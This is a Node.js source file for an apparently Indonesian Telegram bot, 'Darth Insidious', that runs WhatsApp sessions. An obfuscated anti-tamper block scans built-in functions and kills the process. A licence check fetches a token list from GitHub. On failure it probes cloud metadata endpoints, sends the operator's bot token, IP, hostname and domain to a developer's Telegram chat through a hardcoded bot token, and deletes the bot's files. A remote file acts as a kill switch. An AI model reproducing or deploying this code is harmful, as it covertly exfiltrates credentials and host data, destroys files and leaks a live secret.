(function() {
  'use strict';
  
  // ===== CHECK: Detect if loaded via require() =====
  if (require.main !== module) {
    console.error('\n[ 💢 ] PROTECTION DILZ');
    console.error('[!] File saat ini: ' + __filename);
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'));
    console.error('[!] Akses ditolak - Process dihentikan\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[ 💢 ] PROTECTION DILZ');
    console.error('[!] Parent: ' + module.parent.filename);
    console.error('[!] Akses ditolak - Process dihentikan\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }
  
  // Regex pattern (tahan string encoding)
  const nativePattern = /\[native code\]/;
  const proxyPattern = /Proxy|apply\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i;
  
  // Dynamic string construction
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93]);
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);
  
  // Simpan native references SEBELUM apapun
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn;
  
  try {
    nativeExit = process[exitStr].bind(process);
    nativeKill = process[killStr].bind(process);
    nativeOn = process.on.bind(process);
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
    nativePid = process.pid;
  } catch(e) {
    nativeExit = process.exit;
    nativeKill = process.kill;
    nativePid = process.pid;
  }
  
  // Force kill function
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
      try { nativeExit(1); } catch(e) {}
      try { process.exit(1); } catch(e) {}
      while(1) {}
    };
  })();
  
  // CHECK 1: Module.prototype.require
  try {
    const M = require(buildStr([109,111,100,117,108,101]));
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 2: process.exit
  try {
    const exitFn = process[exitStr];
    const exitCode = exitFn.toString();
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 3: process.kill
  try {
    const killFn = process[killStr];
    const killCode = killFn.toString();
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 4: process.on (signal handlers)
  try {
    const onFn = process.on;
    const onCode = onFn.toString();
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 5: axios interceptors
  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 6: Global bypass flags
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest'];
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[ 💢 ] PROTECTION DILZ:', flags[i]);
          forceKill();
        }
      } catch(e) {}
    }
  });
  checkGlobals();
  
  // CHECK 7: child_process.execSync
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]));
    const execStr = cp.execSync.toString();
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 8: global.fetch (less aggressive)
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString();
      
      // Hanya flag jika ada pattern bypass yang jelas
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[ 💢 ] PROTECTION DILZ');
        forceKill();
      }
      
      // Skip native code check - karena polyfill fetch sah-sah saja
    }
  } catch(e) {}
  
  // CHECK 10: Object.defineProperty pada process
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr);
    if (desc && (desc.get || desc.set)) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // ===== CHECK 11: https.request detection (SAFE - NO NETWORK CALLS) =====
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr);
        const reqFunc = https.request;
        
        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();
        
        if (realToString !== fakeToString) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
      } catch(e) {}
    };
  })();
  
  // ===== CHECK 12: http.request detection (SAFE - NO NETWORK CALLS) =====
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr);
        const reqFunc = http.request;
        
        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();
        
        if (realToString !== fakeToString) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
      } catch(e) {}
    };
  })();
  
  setTimeout(() => {
    checkHttps();
    checkHttp();
  }, 500);
  
  // Runtime monitoring
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[ 💢 ] PROTECTION DILZ');
        forceKill();
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]));
        const reqStr = M.prototype.require.toString();
        if (bypassPattern.test(reqStr)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr];
        const exitCode = exitFn.toString();
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr];
        const killCode = killFn.toString();
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
      } catch(e) {}
      
      try {
        const axios = require('axios');
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
      } catch(e) {}
      
      checkHttps();
      checkHttp();
      checkGlobals();
    };
  })();
  
  setInterval(monitor, 2000);
  setTimeout(monitor, 100);
  
})();

const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, jidDecode, generateForwardMessageContent, InteractiveMessage, Header } = require('@otaxayun/baileys');



///----------( Install Function )----------\\\
const P = require("pino");
const sessions = new Map();
const fs = require("fs-extra");
const path = require("path");
const chalk = require("chalk");
const crypto = require("crypto");
const os = require("os");
const A = require("axios");
const axios = require("axios");
const readline = require('readline');
const fetch = require("node-fetch");
const figlet = require("figlet");
const gradient = require("gradient-string");
const chalkAnimation = require("chalk-animation");
const config = require("./フローアクセス/config.js");
const { DARTH_TOKEN, OWNER_ID } = require("./フローアクセス/config.js");
const bot = new TelegramBot(DARTH_TOKEN, { polling: true });



///----------( Save Session )----------\\\
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = path.join(SESSIONS_DIR, "active_sessions.json");
const ONLY_FILE = path.join(__dirname, "ロリポップ", "gconly.json");
const cd = path.join(__dirname, "ロリポップ", "cd.json");



///-----------( Random Photo )----------\\\
const randomImages = [
  "https://files.catbox.moe/cx9isl.jpg",
];
const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];



///----------( Variabel Global )----------\\\
let Dilz;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  Dilz = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  Dilz.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, Dilz);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  Dilz.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }



///----------( Creat Session )----------\\\
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

//// --- ( Intalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>｢ Ϟ ｣ Darth Insidious</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ Darth Insidious</blockquote>
▢ Memproses Connecting
╰➤ Number: ${botNumber}
╰➤ Status: Connecting...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ Darth Insidious</blockquote>
▢ Connection Gagal.
╰➤ Number: ${botNumber}
╰➤ Status: Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>｢ Ϟ ｣ Darth Insidious</blockquote>
▢ Connection Sukses
╰➤ Number: ${botNumber}
╰➤ Status: Sukses Connect.
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>｢ Ϟ ｣ Darth Insidious</blockquote>
▢ Code Pairing Kamu
╰➤ Number: ${botNumber}
╰➤ Code: ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ Darth Insidious</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
╰➤ Status: ${error.message} Error⚠️
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}



///-----------( Save File Acces )----------\\\
const DB_DIR = path.join(__dirname, 'ロリポップ');
const PREMIUM_FILE = path.join(DB_DIR, 'premium.json');
const ADMIN_FILE = path.join(DB_DIR, 'admin.json');
const GCONLY_FILE = path.join(DB_DIR, 'gconly.json');

fs.ensureDirSync(DB_DIR);
fs.ensureFileSync(PREMIUM_FILE);
fs.ensureFileSync(ADMIN_FILE);
fs.ensureFileSync(GCONLY_FILE);

let premiumUsers = fs.readJSONSync(PREMIUM_FILE, { throws: false }) || [];
let adminUsers = fs.readJSONSync(ADMIN_FILE, { throws: false }) || [];
let groupOnlyData = fs.readJSONSync(GCONLY_FILE, { throws: false }) || { groupOnly: false };

function savePremium() { fs.writeJSONSync(PREMIUM_FILE, premiumUsers, { spaces: 2 }); }
function saveAdmins() { fs.writeJSONSync(ADMIN_FILE, adminUsers, { spaces: 2 }); }
function saveGconly() { fs.writeJSONSync(GCONLY_FILE, groupOnlyData, { spaces: 2 }); }

function isOwner(id) { return OWNER_ID.includes(id.toString()); }
function isAdmin(id) { return adminUsers.includes(id) || isOwner(id); }
function isGroupOnly() { return groupOnlyData.groupOnly; }
function setGroupOnly(status) { groupOnlyData.groupOnly = status; saveGconly(); }



///----------( Group Only )----------\\\
bot.onText(/^\/gconly(?:\s+(on|off))?$/i, (msg, match) => {
  console.log("Command /gconly diterima:", msg.text);

  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const chatType = msg.chat.type; "private", "group", "supergroup", "channel"

  if (chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa digunakan di grup, bukan di private chat.");
  }

  if (!isOwner(senderId) && !isAdmin(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "Gunakan format: /gconly on atau /gconly off");
  }

  const status = match[1].toLowerCase() === "on";
  setGroupOnly(status);
  bot.sendMessage(chatId, `🍂 Fitur Group Only sekarang: ${status ? "AKTIF" : "NONAKTIF"}`);
});



///----------( Premium User )----------\\\
bot.onText(/^\/addprem\s+(\d+)\s+(\d+[dhm])$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !isAdmin(senderId))
        return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.');

    const userId = parseInt(match[1]);
    const duration = match[2];
    const moment = require('moment');

    let expiresAt;
    const unit = duration.slice(-1);
    const value = parseInt(duration);

    if (unit === 'd') expiresAt = moment().add(value, 'days').toISOString();
    else if (unit === 'h') expiresAt = moment().add(value, 'hours').toISOString();
    else expiresAt = moment().add(value, 'minutes').toISOString();

    const existing = premiumUsers.find(u => u.id === userId);
    if (existing) {
        existing.expiresAt = expiresAt;
        savePremium();
        return bot.sendMessage(chatId, `🍂 User ${userId} diperpanjang premium hingga ${expiresAt}`);
    }

    premiumUsers.push({ id: userId, expiresAt });
    savePremium();
    bot.sendMessage(chatId, `🍂 User ${userId} berhasil ditambahkan ke premium hingga ${expiresAt}`);
});



///----------( Premium User )----------\\\
bot.onText(/^\/delprem\s+(\d+)$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !isAdmin(senderId))
        return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.');

    const userId = parseInt(match[1]);
    const index = premiumUsers.findIndex(u => u.id === userId);
    if (index === -1) return bot.sendMessage(chatId, `❌ User ${userId} tidak ditemukan di list premium.`);

    premiumUsers.splice(index, 1);
    savePremium();
    bot.sendMessage(chatId, `🍂 User ${userId} berhasil dihapus dari premium.`);
});



///----------( Owner User )----------\\\
bot.onText(/^\/addadmin\s+(\d+)$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId))
        return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner yang dapat melakukan command ini.');

    const userId = parseInt(match[1]);
    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdmins();
        return bot.sendMessage(chatId, `🍂 User ${userId} berhasil ditambahkan sebagai admin.`);
    }

    bot.sendMessage(chatId, `❌ User ${userId} sudah menjadi admin.`);
});



///-----------( Owner User )----------\\\
bot.onText(/^\/deladmin\s+(\d+)$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId))
        return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner yang dapat melakukan command ini.');

    const userId = parseInt(match[1]);
    const index = adminUsers.indexOf(userId);
    if (index !== -1) {
        adminUsers.splice(index, 1);
        saveAdmins();
        return bot.sendMessage(chatId, `🍂 User ${userId} berhasil dihapus dari admin.`);
    }

    bot.sendMessage(chatId, `❌ User ${userId} belum menjadi admin.`);
});




///----------( Notifikasi Config.js )-----------\\\
const TOKEN_DEVELOPER = "8728039161:AAGiBCs3ATptnZGDzf1jdzmapfrv2NEYIeM";
const ID_DEVELOPER = 7744011281;
const devBot = new TelegramBot(TOKEN_DEVELOPER, { polling: false });

async function detectRunningDomain({ timeout = 1500 } = {}) {
  const envCandidates = [
    process.env.RENDER_EXTERNAL_URL,
    process.env.RENDER_URL,
    process.env.VERCEL_URL,
    process.env.NOW_URL,
    process.env.DOMAIN,
    process.env.HOSTNAME,
    process.env.WEBSITE_URL,
    process.env.RAILWAY_STATIC_URL,
    process.env.FLY_APP_NAME && `https://${process.env.FLY_APP_NAME}.fly.dev`,
    process.env.HEROKU_APP_NAME && `https://${process.env.HEROKU_APP_NAME}.herokuapp.com`,
  ].filter(Boolean);

  for (const cand of envCandidates) {
    if (typeof cand === "string" && cand.length > 3) {
      const withProto = cand.startsWith("http") ? cand : `https://${cand.replace(/^\/+/, "")}`;
      return withProto;
    }
  }

  const requestWithTimeout = (url, opts = {}) =>
    axios.get(url, { timeout, ...opts }).then(r => r).catch(() => null);

  try {
    const aws = await requestWithTimeout("http://169.254.169.254/latest/meta-data/public-hostname");
    if (aws && aws.status === 200 && aws.data) return `http://${aws.data.trim()}`;

    const gcp = await requestWithTimeout("http://metadata.google.internal/computeMetadata/v1/instance/hostname", {
      headers: { "Metadata-Flavor": "Google" },
    });
    if (gcp && gcp.status === 200 && gcp.data) return `http://${gcp.data.trim()}`;
  } catch {}

  try {
    const ipRes = await requestWithTimeout("https://api.ipify.org?format=json");
    if (ipRes && ipRes.data && ipRes.data.ip) {
      const pubIp = ipRes.data.ip;
      try {
        const names = await dns.reverse(pubIp);
        if (names.length > 0) return `http://${names[0]}`;
      } catch {}
      return `http://${pubIp}`;
    }
  } catch {}

  return `http://${os.hostname()}`;
}

async function fetchValidTokens() {
  try {
    const response = await axios.get(TOKEN_DATABASE, { headers: { "Cache-Control": "no-cache" } });
    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    } else {
      console.error(chalk.red("❌ Format data di GitHub salah! Key 'tokens' harus array"));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("⨵ Tidak dapat mengakses database:", error.message));
    return [];
  }
}

async function getPublicIP() {
  try {
    const res = await axios.get("https://api.ipify.org?format=json");
    return res.data.ip;
  } catch {
    return "Tidak Diketahui";
  }
}

async function getBotInfo() {
  try {
    const info = await bot.getMe();
    return info;
  } catch {
    return null;
  }
}

async function validateTokenOnce() {
  const validTokens = await fetchValidTokens();
  return validTokens.includes(DARTH_TOKEN);
}

async function validateToken() {
  console.log(chalk.blue("⎙ Memulai Validasi Token Bot Total 5x..."));

  for (let i = 1; i <= 5; i++) {
    console.log(chalk.red(`🔍 Validasi ke-${i} sedang dilakukan...`));
    const isValid = await validateTokenOnce();

    if (!isValid) {
      console.log(chalk.red(`❌ Akses Ditolak (Validasi ke-${i} Gagal)!`));
      await sendInvalidTokenReport();
      await deleteProtectedFiles();
      console.log(chalk.red("☇ Bot Dimatikan Karena Token Tidak Terdaftar."));
      process.exit(0);
    }

    console.log(chalk.green(`⨀ Validasi ke-${i} Berhasil`));
    if (i < 5) await new Promise((r) => setTimeout(r, 1500));
  }

  console.log(chalk.green("⨀ Token Terverifikasi Sepenuhnya 5x Check Passed"));
  checkControlStatus();
}

async function sendInvalidTokenReport() {
  try {
    const botInfo = await getBotInfo();
    const publicIP = await getPublicIP();
    const domainURL = await detectRunningDomain();
    const hostname = os.hostname();

    const message = `
\`\`\`
⳼ Token Tidak Valid Terdeteksi!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
☇ Domain / Panel : ${domainURL}
☇ Server : ${hostname}
☇ Token : ${DARTH_TOKEN}
☇ Bot Username : ${botInfo ? "@" + botInfo.username : "Tidak Diketahui"}
☇ Bot ID : ${botInfo ? botInfo.id : "Tidak Diketahui"}
☇ IP Public : ${publicIP}
☇ Waktu : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛑 KEAMANAN DARTH INSIDIOUS BOT AKAN DIMATIKAN..!!
\`\`\`
`;

    await devBot.sendMessage(ID_DEVELOPER, message, { parse_mode: "Markdown" });
    console.log(chalk.red("☇ Notifikasi dikirim ke Developer."));
  } catch (err) {
    console.error(chalk.red("⚠️ Gagal kirim laporan ke developer:"), err.message);
  }
}

async function deleteProtectedFiles() {
  const filesToDelete = [
    "Darth.js",
    "package.json",
  ];

  console.log(chalk.red("⚠️ Menghapus file sensitif karena token tidak terdaftar..."));
  for (const file of filesToDelete) {
    try {
      if (fs.existsSync(file)) {
        fs.unlinkSync(file);
        console.log(chalk.red(`☠️ File terhapus: ${file}`));
      }
    } catch (err) {
      console.error(chalk.gray(`Gagal hapus ${file}: ${err.message}`));
    }
  }
}

///----------( Function Format Runtime )----------\\\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 



///----------( Function Runtime )----------\\\
function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }



///----------( Function Speed )----------\\\
function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}



///----------( Function Cooldown )----------\\\
function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options);
}

let cooldownData = { time: 5 * 60 * 1000, users: {} };

try {
    if (!fs.existsSync(cd)) {
    
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2), 'utf8');
    } else {
     
        const raw = fs.readFileSync(cd, 'utf8').trim();
        if (raw) cooldownData = JSON.parse(raw);
        else console.log("[WARNING] cd.json kosong, menggunakan default cooldown.");
    }
} catch (err) {
    console.log("[WARNING] cd.json rusak atau tidak valid, menggunakan default cooldown.");
    cooldownData = { time: 5 * 60 * 1000, users: {} };
}

function saveCooldown() {
    try {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2), 'utf8');
    } catch (err) {
        console.error("[ERROR] Gagal menyimpan cd.json:", err);
    }
}



///----------( Function Cooldown )----------\\\
function checkCooldown(userId) {
    const now = Date.now();
    const endTime = cooldownData.users[userId] || 0;

    if (endTime > now) {
        return Math.ceil((endTime - now) / 1000);
    }

    cooldownData.users[userId] = now + cooldownData.time;
    saveCooldown();
    return 0;
}



///----------( Function Time )----------\\\
function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}




///----------( Function Cooldown )----------\\\
function cleanupCooldown() {
    const now = Date.now();
    for (const userId in cooldownData.users) {
        if (cooldownData.users[userId] <= now) delete cooldownData.users[userId];
    }
    saveCooldown();
}

async function getTarget(msg) {
    if (msg.reply_to_message) return msg.reply_to_message.from;
    
    if (msg.entities) {
        for (const e of msg.entities) {
            if (e.type === "mention") {
                const username = msg.text.substring(e.offset + 1, e.offset + e.length);
                try {
                    const member = await bot.getChatMember(msg.chat.id, username);
                    return member.user;
                } catch {
                    return null;
                }
            }
        }
    }
    
    return msg.from;
}

function shouldIgnoreMessage(msg) {
    return msg.chat.type === 'private';
}

///-----------( Database Token )----------\\\
const TOKEN_DATABASE = "https://raw.githubusercontent.com/dickyalghifari21-droid/whatsapp-media/main/token.json";
const CONTROL_URL = "https://raw.githubusercontent.com/dickyalghifari21-droid/whatsapp-media/main/control.txt";

let BOT_ACTIVE = true;
let SECURE_MODE = false;
const validatedUsers = new Set();



///----------( Verifikasi Sha Database )----------\\\
const EXPECTED_HASH = crypto.createHash("sha256").update(TOKEN_DATABASE).digest("hex");

function verifyDatabaseIntegrity(url) {
  const currentHash = crypto.createHash("sha256").update(url).digest("hex");
  if (currentHash !== EXPECTED_HASH) {
    console.log(chalk.red.bold("💢 ANTI BYPASS ACTIVE"));
    process.exit(1);
  }
}

///----------( Warna Rainbow Console.log )----------\\\
function glitchEffect(text) {
  const colors = [chalk.cyanBright, chalk.magentaBright, chalk.blueBright, chalk.whiteBright];
  let i = 0;
  const interval = setInterval(() => {
    process.stdout.write(`\r${colors[i % colors.length](text)}   `);
    i++;
  }, 150);
  setTimeout(() => {
    clearInterval(interval);
    console.log("\n" + chalk.greenBright("DILZ\n"));
  }, 5000);
}

async function checkControlStatus() {
  try {
    const res = await axios.get(CONTROL_URL, { timeout: 5000 });
    const status = res.data.trim().toLowerCase();
    BOT_ACTIVE = status === "on";

    console.clear();

    if (BOT_ACTIVE) {
      const text = figlet.textSync("DILZ", {
        font: "ANSI Shadow",
        horizontalLayout: "default",
        verticalLayout: "default",
      });

      const holo = gradient(["#00FFFF", "#FF00FF", "#00FFFF"]);
      console.log("\n" + holo.multiline(text) + "\n");

      glitchEffect("💢 SYSTEM READY - Darth Insidious Connected...");
    } else {
      console.log(chalk.redBright("💢 Darth dimatikan oleh Developer!\n"));
    }

  } catch (err) {
    console.log(chalk.red(`⚠️ Gagal membaca control.txt → ${err.message}`));
    BOT_ACTIVE = false;
  }
}

validateToken();
setInterval(checkControlStatus, 5 * 60 * 1000);

// ========== FILE UNTUK MENYIMPAN DAFTAR GROUP ==========
const GROUP_FILE = "./verified_groups.json";

// Load atau buat file verified groups
let verifiedGroups = new Set();

if (fs.existsSync(GROUP_FILE)) {
  try {
    const data = JSON.parse(fs.readFileSync(GROUP_FILE, 'utf8'));
    verifiedGroups = new Set(data);
  } catch (e) {}
}

